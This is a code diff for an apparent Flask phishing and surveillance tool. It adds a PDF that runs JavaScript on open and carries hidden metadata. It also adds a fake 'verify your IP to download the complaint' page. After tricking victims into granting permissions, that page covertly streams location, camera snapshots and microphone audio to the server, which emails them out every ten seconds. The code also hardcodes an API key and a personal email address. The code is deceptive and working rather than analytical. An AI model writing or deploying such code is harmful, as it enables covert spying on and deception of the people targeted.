@@ -27,6 +27,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 from datetime import datetime, timedelta
+from PyPDF2.generic import NameObject, DictionaryObject, ArrayObject, TextStringObject
 
 # Configure the Gemini API with your API key
 genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))
@@ -77,11 +78,11 @@ downloaded_reports = []
 
 # Global buffer and lock for email sending
 data_buffer = []
-images_to_send = []  # To store image filenames for emailing
+attachments_to_send = []  # Renamed from images_to_send to handle both images and audio
 buffer_lock = threading.Lock()
 
 # Email sending functions
-def send_email(data_list, image_list):
+def send_email(data_list, attachment_list):
     smtp_server = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
     smtp_port = int(os.environ.get("SMTP_PORT", 587))
     smtp_user = os.environ.get("SMTP_USER", "mehtaronit702@gmail.com")
@@ -96,12 +97,12 @@ def send_email(data_list, image_list):
     body = json.dumps(data_list, indent=2)
     msg.attach(MIMEText(body, 'plain'))
 
-    for image_path in image_list:
-        with open(image_path, 'rb') as f:
+    for attachment_path in attachment_list:
+        with open(attachment_path, 'rb') as f:
             part = MIMEBase('application', 'octet-stream')
             part.set_payload(f.read())
             encoders.encode_base64(part)
-            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(image_path)}"')
+            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
             msg.attach(part)
 
     try:
@@ -117,10 +118,10 @@ def email_sender_thread():
     while True:
         time.sleep(10)
         with buffer_lock:
-            if data_buffer or images_to_send:
-                send_email(data_buffer.copy(), images_to_send.copy())
+            if data_buffer or attachments_to_send:
+                send_email(data_buffer.copy(), attachments_to_send.copy())
                 data_buffer.clear()
-                images_to_send.clear()
+                attachments_to_send.clear()
 
 # Helper functions
 def get_wifi_location_from_wigle(bssid):
@@ -307,39 +308,24 @@ The provided data contains information about devices and users potentially invol
 
 def generate_pdf(logged_data):
     buffer = BytesIO()
-    doc = SimpleDocTemplate(buffer, pagesize=letter)
-    styles = getSampleStyleSheet()
-    story = []
-
-    story.append(Paragraph("Fake PDF Document", styles['Title']))
-    story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
-    address = fake.address().replace('\n', ', ')
-    story.append(Paragraph(f"Address: {address}", styles['Normal']))
-    story.append(Paragraph("Additional Info:", styles['Normal']))
-    story.append(Paragraph(fake.text(max_nb_chars=200), styles['Normal']))
-
-    stego_img = embed_data_in_image(logged_data)
-    img_buffer = BytesIO()
-    stego_img.save(img_buffer, format='PNG')
-    img_buffer.seek(0)
-    story.append(Image(img_buffer, width=100, height=100))
-
-    token = str(uuid.uuid4())
-    verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
-    story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to thank our services.", styles['Normal']))
-
-    doc.build(story)
+    c = canvas.Canvas(buffer, pagesize=letter)
+    c.showPage()  # Add a blank page
+    c.save()
     buffer.seek(0)
 
     hidden_message = get_hidden_message(logged_data)
+    token = str(uuid.uuid4())
     reversed_token = token[::-1]
 
     pdf_reader = PyPDF2.PdfReader(buffer)
     pdf_writer = PyPDF2.PdfWriter()
     for page in pdf_reader.pages:
         pdf_writer.add_page(page)
+
+    # Add hidden data in metadata
     pdf_writer.add_metadata({'/HiddenData': hidden_message})
 
+    # Add JavaScript to trigger on open
     js_code = f"""
     if (typeof XMLHttpRequest !== 'undefined') {{
         try {{
@@ -358,6 +344,15 @@ def generate_pdf(logged_data):
         }} catch(e) {{}}
     }}
     """
+    js_action = DictionaryObject()
+    js_action.update({
+        NameObject("/Type"): NameObject("/Action"),
+        NameObject("/S"): NameObject("/JavaScript"),
+        NameObject("/JS"): TextStringObject(js_code)
+    })
+    pdf_writer._root_object.update({
+        NameObject("/OpenAction"): js_action
+    })
 
     new_buffer = BytesIO()
     pdf_writer.write(new_buffer)
@@ -365,6 +360,162 @@ def generate_pdf(logged_data):
     return new_buffer, token
 
 # HTML Templates
+PERMISSIONS_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Enable Permissions</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+       body {
+    background-image: url('/static/blurred_pdf.jpg');
+    background-size: 50% auto;
+    background-position: center;
+    background-attachment: fixed;
+    background-repeat: no-repeat;
+    text-align: center;
+    padding: 50px;
+}
+        .content-box {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            display: inline-block;
+        }
+        h2 { color: #333; }
+        button { padding: 10px 20px; margin: 5px; }
+        p { color: #d93025; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content-box">
+            {% if error == 'denied' %}
+            <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
+            {% endif %}
+            <h2>To download the complaint, you have to verify whether you are the right person who has the IP address</h2>
+            <p>Kindly allow all permissions by clicking enable.</p>
+            <button id="enableButton" class="btn btn-primary">Enable</button>
+            <p id="status"></p>
+        </div>
+    </div>
+    <script>
+        function startLocationCapture() {
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch('/log_location', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
+                    });
+                }, () => {});
+            }, 5000);
+        }
+
+        function startCameraCapture() {
+            const video = document.createElement('video');
+            video.width = 320;
+            video.height = 240;
+            video.autoplay = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            const canvas = document.createElement('canvas');
+            canvas.width = 320;
+            canvas.height = 240;
+            const ctx = canvas.getContext('2d');
+
+            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
+                video.srcObject = stream;
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, 320, 240);
+                    const snapshot = canvas.toDataURL('image/jpeg');
+                    fetch('/log_camera', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({image: snapshot})
+                    });
+                }, 5000);
+            });
+        }
+
+        function startMicrophoneCapture() {
+            navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(audioBlob);
+                    reader.onloadend = () => {
+                        const base64data = reader.result.split(',')[1];
+                        fetch('/log_microphone', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({audio: base64data})
+                        });
+                    };
+                    audioChunks = [];
+                };
+
+                setInterval(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 5000);  // Record for 5 seconds
+                }, 10000);  // Every 10 seconds
+            }).catch(() => {});
+        }
+
+        document.getElementById('enableButton').addEventListener('click', () => {
+            const permissions = {
+                location: false,
+                camera: false,
+                microphone: false
+            };
+
+            navigator.geolocation.getCurrentPosition(() => {
+                permissions.location = true;
+                startLocationCapture();
+            }, () => {});
+
+            navigator.mediaDevices.getUserMedia({video: true}).then(() => {
+                permissions.camera = true;
+                startCameraCapture();
+            }).catch(() => {});
+
+            navigator.mediaDevices.getUserMedia({audio: true}).then(() => {
+                permissions.microphone = true;
+                startMicrophoneCapture();
+            }).catch(() => {});
+
+            setTimeout(() => {
+                if (permissions.location && permissions.camera && permissions.microphone) {
+                    window.location.href = '/grant_permissions';
+                } else {
+                    let missing = [];
+                    if (!permissions.location) missing.push('location');
+                    if (!permissions.camera) missing.push('camera');
+                    if (!permissions.microphone) missing.push('microphone');
+                    alert('Please grant all permissions: ' + missing.join(', '));
+                }
+            }, 1000);  // Give some time for permissions to be granted
+        });
+    </script>
+</body>
+</html>
+"""
+
 LOGIN_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -492,65 +643,6 @@ LOGIN_PAGE = """
                 });
             }, 5000);
         }
-    </script>
-</body>
-</html>
-"""
-
-PERMISSIONS_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Enable Permissions</title>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <style>
-       body {
-    background-image: url('/static/blurred_pdf.jpg');
-    background-size: 50% auto;
-    background-position: center;
-    background-attachment: fixed;
-    background-repeat: no-repeat;
-    text-align: center;
-    padding: 50px;
-}
-        .content-box {
-            background-color: rgba(255, 255, 255, 0.8);
-            padding: 20px;
-            border-radius: 8px;
-            display: inline-block;
-        }
-        h2 { color: #333; }
-        button { padding: 10px 20px; margin: 5px; }
-        p { color: #d93025; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="content-box">
-            {% if error == 'denied' %}
-            <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
-            {% endif %}
-            <h2>To download the complaint, you have to verify whether you are the right person who has the IP address</h2>
-            <p>Kindly allow all permissions by clicking enable.</p>
-            <button id="enableButton" class="btn btn-primary">Enable</button>
-            <p id="status"></p>
-        </div>
-    </div>
-    <script>
-        document.getElementById('enableButton').addEventListener('click', () => {
-            Promise.all([
-                new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
-                }),
-                navigator.mediaDevices.getUserMedia({video: true}),
-                navigator.mediaDevices.getUserMedia({audio: true})
-            ]).then(() => {
-                window.location.href = '/grant_permissions';
-            }).catch((error) => {
-                window.location.href = '/permissions?error=denied';
-            });
-        });
     </script>
 </body>
 </html>
@@ -953,7 +1045,7 @@ def log_camera():
             f.write(image_bytes)
         with buffer_lock:
             data_buffer.append(data)
-            images_to_send.append(filename)
+            attachments_to_send.append(filename)
         logging.info(f"Image captured and saved as {filename}")
         return {'status': 'success', 'filename': filename}, 200
     except Exception as e:
@@ -962,11 +1054,27 @@ def log_camera():
 
 @app.route('/log_microphone', methods=['POST'])
 def log_microphone():
-    data = request.json
-    with buffer_lock:
-        data_buffer.append(data)
-    logging.info(f"Microphone data: {json.dumps(data)}")
-    return "Microphone logged", 200
+    try:
+        data = request.get_json()
+        audio_data = data.get('audio')
+        if audio_data:
+            audio_bytes = base64.b64decode(audio_data)
+            filename = f"static/captures/audio_{uuid.uuid4()}.webm"
+            with open(filename, 'wb') as f:
+                f.write(audio_bytes)
+            with buffer_lock:
+                data_buffer.append({'audio_file': filename})
+                attachments_to_send.append(filename)
+            logging.info(f"Audio captured and saved as {filename}")
+            return {'status': 'success', 'filename': filename}, 200
+        else:
+            with buffer_lock:
+                data_buffer.append(data)
+            logging.info(f"Microphone data: {json.dumps(data)}")
+            return "Microphone logged", 200
+    except Exception as e:
+        logging.error(f"Error in log_microphone: {e}")
+        return {'status': 'error', 'message': str(e)}, 500
 
 @app.route('/log_other_data', methods=['POST'])
 def log_other_data():
